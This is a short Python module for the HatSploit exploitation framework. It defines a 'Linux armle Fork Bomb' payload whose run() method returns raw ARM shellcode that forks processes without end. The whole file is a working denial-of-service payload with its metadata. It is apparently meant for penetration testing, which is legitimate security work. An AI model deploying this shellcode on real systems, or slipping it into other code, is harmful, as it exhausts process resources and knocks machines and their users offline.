"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Name': "Linux armle Fork Bomb",
        'Payload': "linux/armle/fork_bomb",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer',
        ],
        'Description': "Fork bomb payload for Linux armle.",
        'Architecture': "armle",
        'Platform': "linux",
        'Rank': "low",
        'Type': "one_side",
    }

    def run(self):
        return (
            b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7f\x40"
            b"\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff"
        )
